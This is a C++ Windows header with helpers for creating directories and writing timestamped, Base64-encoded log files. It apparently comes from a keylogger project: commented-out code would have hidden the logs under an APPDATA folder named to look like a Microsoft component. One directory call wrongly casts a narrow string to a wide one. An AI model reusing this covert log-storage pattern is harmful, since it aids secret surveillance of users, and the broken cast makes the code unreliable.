#pragma once

#ifndef _IO_H_
# define _IO_H_

#include <string>
// will be using this for getenv() function
#include <cstdlib>
#include <fstream>
#include <windows.h>

#include "Helper.h"
#include "Base64.h"

namespace IO {
	auto GetOurPath(const bool append_separator = false)->std::string {
		//std::string appdata_dir(getenv("APPDATA"));
		//std::string appdata_dir(_dupenv_s("APPDATA"));
		//std::string full = appdata_dir + "\\Microsoft\\CLR";
		//return full + (append_separator ? "\\" : "");
		return ""; // return empty string
	}

	bool MkOneDir(std::string path) {
		return (bool)CreateDirectory((LPCWSTR)path.c_str(), NULL) || 
			GetLastError() == ERROR_ALREADY_EXISTS;
	}

	bool MkDir(std::string path) {
		for (char& c : path) {
			if (c == '\\') {
				c = '\0';
				if (!MkOneDir(path))
					return false;
				c = '\\';
			}
		}
		return true;
	}

	template <typename T>
	auto WriteLog(const T& t)->std::string {
		std::string path = GetOurPath(true);
		Helper::DateTime dt;
		std::string name = dt.GetDateTimeString("_") + ".log";

		try {
			std::ofstream file(path + name);
			if (!file) return "";
			std::ostringstream s;
			s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
			std::string data = BASE64::EncryptB64(s.str());
			file << data;
			if (!file)
				return "";
			file.close();
			return name;
		}
		catch (...) {
			return "";
		}
	}
}

#endif // _IO_H_